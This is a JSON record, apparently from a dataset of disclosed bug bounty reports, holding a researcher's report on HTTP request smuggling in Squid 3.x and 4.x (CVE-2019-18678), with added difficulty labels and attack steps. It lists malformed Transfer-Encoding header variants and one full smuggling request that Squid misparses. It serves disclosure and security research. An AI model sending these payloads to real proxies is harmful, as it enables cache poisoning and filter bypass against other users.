{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "regilero ",
  "title": "HTTP Smuggling multiple issues in Squid 3.x & squid 4.x",
  "content": "\nHello, as can be seen on a recent public security update by Squid I reported several smuggling issues.\nIf you want some background on impact of Smuggling issues You can check the current works of James Keetle or my own previous published works.\nhttps://www.youtube.com/watch?v=upEMlJeU_Ik HTTP Desync Attacks: Smashing Into The Cell Next Door - James Kettle\nhttps://www.youtube.com/watch?v=dVU9i5PsMPY DEF CON 24 - regilero - Hiding Wookiees in HTTP: HTTP smuggling\nBut I'm quite sure that the recent additions of Smuggling tools in Burp suite is making Smuggling impacts issues more easy to understand now.\nCVE-2019-18678\nhttp://www.squid-cache.org/Advisories/SQUID-2019_10.txt\ncurrent score (5 / 5.3) available at :\nhttps://www.suse.com/fr-fr/security/cve/CVE-2019-18678/\nAdvisory ID: SQUID-2019:10\nDate: November 05, 2019\nSummary: HTTP Request Splitting issue\nin HTTP message processing.\nAffected versions: Squid 3.0 -> 3.5.28\nSquid 4.x -> 4.8\nFixed in version: Squid 4.9\n---------------------------->\nhttp://www.squid-cache.org/Advisories/SQUID-2019_10.txt\n(...)\nCredits:\nThis vulnerability was discovered by by R\u00e9gis Leroy (regilero\nfrom Makina Corpus).\nFixed by Amos Jeffries of Treehouse Networks Ltd.\nRevision history:\n2019-07-24 11:52:51 UTC Initial Report\n2019-09-11 02:52:52 UTC Patches Released\n2019-11-04 13:43:22 UTC CVE Assignment\nI can give more details than what is publicly available.\nOn the initial report from 2019-07-24 there were 4 issues. Only 1 of these issues is currently covered by the CVE-2019-18678.\nIssue 1 : undisclosed Squid 3 issue\nThere is also an undisclosed Security filter bypass for Squid 3.x. This is a wonfix for Squid because Squid 3.x is not maintained anymore.\nWithout complete details this is an abuse of separators characters which allows access to urls where a security filter in Squid is present to prevent such locations from being accessed.\nProject maintainer response:\nPlease be aware that Squid-3 has been deprecated for several years now.\nSeveral of the problems you are pointing out are well-known issues with\nthe HTTP protocol design from RFC2616 itself not being clear. Squid-3\nprimarily implements that specification, with only sprinkling of RFC7230.\nSquid-4 increases the upgrade to RFC7230 specification with\nimplementation of the majority of message parsing updates. Though that\nis still an ongoing work.\n(...)\nAs do Squid-4 releases. The fix is to upgrade the proxy to a version\nwhere the problem has been fixed.\nIssue 2 : HTTP Response Splitting issue on bad withespaces before header's colon\nSquid allowed bad withespaces characters between the header title and the colon (before value).\nThis is forbidden in RFC 7230.\n3.2. Header Fields\nEach header field consists of a case-insensitive field name followed\nby a colon (\":\"), optional leading whitespace, the field value, and\noptional trailing whitespace.\nheader-field = field-name \":\" OWS field-value OWS\nfield-name = token\n(...)\n3.2.4. Field Parsing\n(...)\nNo whitespace is allowed between the header field-name and colon. In\nthe past, differences in the handling of such whitespace have led to\nsecurity vulnerabilities in request routing and response handling. A\nserver MUST reject any received request message that contains\nwhitespace between a header field-name and colon with a response code\nof 400 (Bad Request). A proxy MUST remove any such whitespace from a\nresponse message before forwarding the message downstream.\nThis could be used to perform HTTP Smuggling attacks (if you want more details on exploitations I can add some very detailled examples, I'll just give you a short version).\nVarious invalid syntax where a space or pseudo space is added before ':' in the header line could be used against Squid to obtain an HTTP Response splitting attack:\nTransfer-Encoding : chunked\\r\\n\nTransfer-Encoding\\t: chunked\\r\\n\nTransfer-Encoding\\f: chunked\\r\\n\nTransfer-Encoding\\f: chunked\\r\\n\nTransfer-Encoding\\r: chunked\\r\\n\nTransfer-Encoding\\x0b: chunked\\r\\n\nTransfer-Encoding\\t\\x0b \\r\\f: chunked\\r\\n\nSquid would give 3 response for this request (it should see only 2 requests, one from 01 to 12, and one from 13 to 15, but Squid saw one from 01 to 08, one from 09 to 12 and one from 14 to 15):\n01 POST /?t=41 HTTP/1.1\\r\\n\n02 Host: dummy-host.example.com\\r\\n\n03 X-REQUEST-IDENTIFIER: 41\\r\\n\n04 Content-Length: 92\\r\\n\n05 Transfer-Encoding\\x0b: chunked\\r\\n\n06 \\r\\n\n07 0\\r\\n\n08 \\r\\n\n09 GET /foo.html?t=42 HTTP/1.1\\r\\n\n10 Host: dummy-host.example.com\\r\\n\n11 X-REQUEST-IDENTIFIER: 42\\r\\n\n12 \\r\\n\n13 GET /bar.html?t=43 HTTP/1.1\\r\\n\n14 Host: dummy-host.example.com\\r\\n\n15 X-REQUEST-IDENTIFIER: 43\\r\\n\n15 \\r\\n\nImpacts are quite high, like HTTP Cache poisoning for any actor set in front of Squid, and security filter bypass for this previous actor also. Adding extra responses from the Squid stream is definitively a good way for adding choas on the HTTP chain (Dos, Xss, etc).\nIssue 3 : Undisclosed SeverSide Request Forgery issue\nThis one is only fixed on master. The fix is not present on any published version of Squid. So we may talk about it later.\nIssue 4 : Undisclosed HTTP Request Splitting\nThis one is still present and not yet fixed. So we may talk about it later, because I think it will be fixed one day.\nI'm pretty sure this issue will soon be discovered by other bounty hunters. So I don't know if I should already give more details to claim precedence, currently I'll keep the details undisclosed and let the project maintainers act on that.\nSummary\nIssue #2 is the one covered by the published CVE.\nFor issues #3 & #4 I'm pretty sure that I will make reports later.\nFor issue #1 I'm not sure this can be covered by this program, I could give you more details if you want.\nImpact\nLike most HTTP Smuggling issue impact is not always directly targeted on Squid, here (if we only talk about issue #2) the impact is very important for HTTP actors set in front of squid (like an SSL terminator).\nCache poisoning, DOS, XSS, etc.\n\n",
  "severity": [
    9.6,
    null
  ],
  "bounty": 1000,
  "weaknesses": [
    "HTTP Response Splitting"
  ],
  "screenshots": {},
  "disclosed_date": 1630036620,
  "report_url": "https://hackerone.com/reports/758445",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Craft a malicious HTTP request with invalid whitespace characters before the colon in a header (e.g., 'Transfer-Encoding\\x0b: chunked\\r\\n')"
    ],
    [
      2,
      "Send the crafted request to a vulnerable Squid proxy server to trigger HTTP response splitting"
    ]
  ],
  "vuln_description": "The vulnerability is an HTTP response splitting issue in Squid proxy (versions 3.0-3.5.28 and 4.x-4.8) where invalid whitespace characters before the colon in HTTP headers are improperly processed. This allows attackers to perform HTTP smuggling attacks, leading to cache poisoning, security filter bypasses, and other HTTP chain disruptions.",
  "reason": "This vulnerability requires understanding of HTTP protocol specifications (RFC 7230), knowledge of HTTP smuggling techniques, and the ability to craft malicious requests with specific whitespace characters. The attack involves subtle protocol parsing differences and non-obvious interactions between the proxy's HTTP processing and downstream systems.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}